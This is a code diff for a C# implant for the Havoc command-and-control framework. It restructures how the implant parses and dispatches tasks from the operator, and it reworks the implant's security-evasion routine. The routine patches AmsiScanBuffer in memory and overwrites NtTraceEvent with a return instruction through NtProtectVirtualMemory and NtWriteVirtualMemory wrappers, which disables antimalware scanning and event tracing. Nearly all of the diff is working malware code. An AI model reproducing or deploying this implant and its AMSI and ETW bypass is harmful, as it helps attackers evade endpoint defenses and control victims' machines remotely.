@@ -104,7 +104,9 @@ namespace HavocImplant
                     while (offset < rawTasks.Length)
                     {
 
-                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0) - 1; // [4 bytes containing size of task][task]
+                        // [4 bytes containing size of task][task]
+                        // The trailing nullbytes is removed within the handler, but after size calculation, so we need to account for it here
+                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0) - 1;
                         Console.WriteLine($"Task JSON is of size {size}");
 
                         Task = Communications.Utils.ParseTask(rawTasks, size, offset);
@@ -147,7 +149,14 @@ namespace HavocImplant
                 Comms.CheckIn(implant, cumalativeOutput, "commandoutput");
             }
         }
-       
+        public static async Task HandleCommand(task Task, int taskId)
+        {
+            if (Task.taskCommand == "exit") Environment.Exit(0);
+            var com = Commands.FirstOrDefault(c => c.Command == Task.taskCommand);
+            if (com.Dangerous == true)
+                await com.Run(taskId);
+            else com.Run(taskId);
+        }
         static string getIPv4()
         {
             foreach (var a in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
@@ -173,26 +182,29 @@ namespace HavocImplant
             patch[4] = 0x80;
             patch[5] = 0xc3;
             IntPtr pAmsi = (IntPtr)globalDll.kernel32.dynamicExecute<Delegates.LoadLibraryA>("LoadLibraryA", new object[] {"amsi.dll"});
-            Console.WriteLine("Amsi at 0x{0:X}", (long)pAmsi);
             dll amsi = new dll("amsi.dll");
             IntPtr pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"];
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_READWRITE, (uint)0 });
+            IntPtr aPatchSize = (IntPtr)patch.Length;
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pAmsiScanBuffer, ref aPatchSize, Structs.Win32.Enums.PAGE_READWRITE, out uint unused);
+            
             GCHandle hPatch = GCHandle.Alloc(patch, GCHandleType.Pinned);
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory",  new object[] { (IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, (uint)0});
+            Wrappers.NtWriteVirtualMemory((IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, out unused);
             hPatch.Free();
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
+
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pAmsiScanBuffer, ref aPatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READ, out unused);
+
             // ETW
             IntPtr pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, (uint)0 });
-            Marshal.WriteByte(pNtTraceEvent, 0xc3);
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
+            IntPtr ePatchSize = (IntPtr)1;
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pNtTraceEvent, ref ePatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, out unused);
+           
+            hPatch = GCHandle.Alloc(new byte[] { 0xc3 }, GCHandleType.Pinned);
+            Wrappers.NtWriteVirtualMemory((IntPtr)(-1), pNtTraceEvent, hPatch.AddrOfPinnedObject(), (uint)1, out unused);
+            hPatch.Free();
+
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pNtTraceEvent, ref ePatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READ, out unused);
             
         }
 
-        public static async Task HandleCommand(task Task, int taskId)
-        {
-            var com = Commands.FirstOrDefault(c => c.Command == Task.taskCommand);
-            com.Run(taskId);
-        }
     }
 }
